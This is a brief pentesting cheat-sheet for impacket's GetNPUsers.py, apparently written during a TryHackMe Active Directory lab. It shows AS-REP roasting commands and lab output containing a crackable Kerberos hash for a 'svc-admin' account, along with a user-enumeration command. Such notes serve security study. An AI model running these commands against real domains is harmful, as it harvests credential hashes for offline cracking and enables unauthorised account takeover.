# GetNPUsers.py
from impacket
## Examples
### get users without auth
```
python3 /usr/share/doc/python3-impacket/examples/GETNPUsers.py $DOMAIN_NAME_FROM_SCAN/ -dc-ip $IP -no-pass -usersfile valid_users.txt
```
#### Examples
##### Success
```
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 GetNPUsers.py THM-AD/ -dc-ip 10.10.213.211 -no-pass -usersfile /home/kali/Documents/attacktive-directory/valid_users.txt 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User james@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@spookysec.local@THM-AD:5075e0a73adb4ff21b0dc6a6a000d115$92f853852980746d406fc4eb36ec684f61d22e1e362637ceb8b08b8b13bd02006ddbb004dfa6a0221cf5aa72e3e278548d198cd5a64e4c80c42a9b5b22255f2e3bef7aaa84db26c1b7795c4451514b96527ccc8fdf22e01315fe66431d0b6e6676d27f7da7a0c8dd6cf1d6c0b723e26f90ca9d260775a5bf593a8b67d85b63f6ccdcb3491fcc408e0970c063dd144f30e2981aec530007c7fdb41ff088b7dbb49cc2e712dc32805706a1d0d9005c1097ad814838fd8105be62c6a1a31275768acde7c1a04dcaea969f7bc7fb7fa33e122e0865bb0c7264db31cff7198b00425eda6b175b65289ec207
[-] User James@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARKSTAR@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROBIN@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                                                                                           
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$
```
##### Failure - No PREAUTH set
see above success with usernames without a ticket hash

### Get all users in AD
```
GETNPUsers.py $DOMAIN_NAME_FROM_SCAN/ -dc-ip $IP -debug
```